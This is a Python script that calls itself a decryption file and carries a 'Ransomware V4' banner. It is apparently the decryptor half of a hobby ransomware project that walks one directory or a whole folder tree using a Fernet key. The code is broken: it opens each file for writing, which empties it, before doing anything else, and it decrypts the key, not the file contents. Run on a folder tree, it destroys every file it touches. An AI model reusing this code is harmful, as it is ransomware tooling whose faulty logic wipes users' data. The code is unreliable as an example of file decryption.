#!/usr/bin/env python4

"""Decryption file !"""

welcome_art = """\
$$$$$$$\                                                                                                                     $$\   $$\ 
$$  __$$\                                                                                                                    $$ |  $$ |
$$ |  $$ | $$$$$$\  $$$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$\$$$$\  $$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$\        $$\    $$\ $$ |  $$ |
$$$$$$$  | \____$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _$$  _$$\ $$ | $$ | $$ | \____$$\ $$  __$$\ $$  __$$\       \$$\  $$  |$$$$$$$$ |
$$  __$$<  $$$$$$$ |$$ |  $$ |\$$$$$$\  $$ /  $$ |$$ / $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ |  \__|$$$$$$$$ |       \$$\$$  / \_____$$ |
$$ |  $$ |$$  __$$ |$$ |  $$ | \____$$\ $$ |  $$ |$$ | $$ | $$ |$$ | $$ | $$ |$$  __$$ |$$ |      $$   ____|        \$$$  /        $$ |
$$ |  $$ |\$$$$$$$ |$$ |  $$ |$$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$\$$$$  |\$$$$$$$ |$$ |      \$$$$$$$\          \$  /         $$ |
\__|  \__| \_______|\__|  \__|\_______/  \______/ \__| \__| \__| \_____\____/  \_______|\__|       \_______|          \_/          \__|
"""

from cryptography.fernet import Fernet 
import os 


def decrypt(dir):
    content = os.listdir(dir)
    file_number = len(content)

    with open("key.key", "rb") as key:
        decryption_key = key.read()

    for file_id in range(len(content)):
        file_name = dir + "/" +content[file_id]

        if content[file_id] == "key.key" or content[file_id] == "main_decrypt.py":
            continue

        if not os.path.isfile(file_name):
            file_number -= 1 
            continue 

        with open(content[file_id], 'wb') as encrypted_file:

            fernet = Fernet(key=decryption_key)
            decrypted_text = Fernet.decrypt(fernet, decryption_key)
            encrypted_file.write(decrypted_text) 

        advancment = (100 * (file_id + 1)) / file_number 
        print(f"[{file_id + 1}/{len(content)}]" + "[" + "#" * int(advancment / 100) + " " * (100 - int(advancment / 100)) + "]" , f"{advancment}%" , f"Decrypting {file_name}...", end="\r")

    print("\n")

def recursive_decrypt(root):
    print("Finding files...", end="")
    all_files = tuple(os.walk(root))
    print("Done", f"{len(all_files)} files found")
    
    print("Getting decryption key..." , end='')

    with open('key.key', 'rb') as key:
        decryption_key = key.read()
    
    print("Done") 

    for dir_id in range(len(all_files)):

        for file_id in range(len(all_files[dir_id][2])):
            file_name = all_files[dir_id][0] + "/" + all_files[dir_id][2][file_id]

            if all_files[dir_id][2][file_id] == 'key.key' or all_files[dir_id][2][file_id] == 'main_decrypt.py':
                continue

            with open(file_name, 'wb') as encrypted_file:

                fernet = Fernet(key=decryption_key)
                decrypted_text = fernet.decrypt(decryption_key)
                encrypted_file.write(decrypted_text)
                
        total_advancment = int((100 * (dir_id + 1)) / len(all_files))
        current_folder = all_files[dir_id][0].split("/")[-1]
        print(f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]", f"{total_advancment}%", f"Encrypting {current_folder}...", end="\r")
    print("")


def main():
    print(welcome_art)
    decision = input("Do you want to decrypt a single directory (c) or do you want to decrypt all subdirectories from source (a) ? [c/a] ")

    if decision == 'c':
        dir = input("What directory do you wish to decrypt ? (RECOMMENDED: use absolute path): ")
        decrypt(dir)

    elif decision == 'a':
        root = input("From wich root file do you want to decrypt ? (RECOMMENDED: use absolute path): ")
        recursive_decrypt(root)


if __name__ == '__main__':
    main()
    
